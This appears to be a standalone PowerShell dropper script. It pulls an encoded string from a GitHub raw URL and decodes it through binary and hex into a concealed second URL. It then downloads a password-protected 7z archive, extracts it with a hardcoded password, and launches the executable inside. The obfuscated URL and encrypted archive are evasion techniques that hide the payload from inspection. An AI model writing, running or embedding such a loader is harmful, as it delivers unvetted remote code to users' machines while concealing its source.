Function Convert-EncodedStringToBinary {
    Param ([string]$encodedString)
    # Convert characters to binary based on your encoding scheme
    $binaryString = $encodedString -replace ',', '0' -replace '\.', '1'
    Write-Host "Display encoded:"
    Write-Host $encodedString
    Write-Host "Display binary:"
    Write-Host $binaryString
    return $binaryString
}

Function Convert-BinaryToHex {
    Param ([string]$binaryString)
    $binaryGroups = $binaryString -split '(?<=\G.{8})'
    $hexString = $binaryGroups | ForEach-Object {
        if ($_ -match '^[01]{8}$') {
            '{0:X2}' -f [Convert]::ToInt32($_, 2)
        } else {
            Write-Error "Invalid binary group: $_"
            return $null
        }
    }
    Write-Host "Display hex:"
    $hex = $hexString -join ''
    Write-Host $hex
    return $hex
}

Function Convert-HexToASCII {
    Param ([string]$hexString)
    $bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
        [Convert]::ToByte($hexString.Substring($i, 2), 16)
    }
    $asciiText = [System.Text.Encoding]::ASCII.GetString($bytes)
    Write-Host "Display ascii:"
    Write-Host $asciiText
    return $asciiText
}

Function Download-File {
    Param ([string]$url, [string]$path)
    Write-Host "Display URL:"
    Write-Host $url
    Invoke-WebRequest -Uri $url -OutFile $path
}

Function DownloadAndExtract7Zip {
    $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
    $sevenZipDownloadPath = "S:\downloader\7za.zip"
    $sevenZipExtractPath = "S:\downloader\7zip"
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
    Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
}

Function Get-DecryptedPassword {
    $hardcodedBinary = "0011000100110010001100110011010000110101"
    $password = ($hardcodedBinary -split '(?<=\G.{8})' | ForEach-Object { [char][Convert]::ToInt32($_, 2) }) -join ''
    Write-Host "Display password:"
    Write-Host $password
    return $password
}

# Main script execution flow corrected
$url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt" # Use the actual GitHub URL where the encoded string is hosted
$rawText = Invoke-RestMethod -Uri $url
Write-Host "Display text (Encoded):"
Write-Host $rawText

$binaryString = Convert-EncodedStringToBinary -encodedString $rawText
$hexString = Convert-BinaryToHex -binaryString $binaryString
$asciiText = Convert-HexToASCII -hexString $hexString # Now correctly interpreted as the final URL

$downloadPath = "S:\downloader\DownloadedFile.7z"
Download-File -url $asciiText -path $downloadPath

DownloadAndExtract7Zip

$password = Get-DecryptedPassword
$sevenZipCmdPath = "S:\downloader\7zip\7za.exe"
& $sevenZipCmdPath x $downloadPath -o"S:\downloader\ExtractedFile" -p$password

$extractedFilePath = "S:\downloader\YourExecutable.exe"
if (Test-Path -Path $extractedFilePath) {
Invoke-Item $extractedFilePath
} else {
Write-Error "The extracted file does not exist."
}
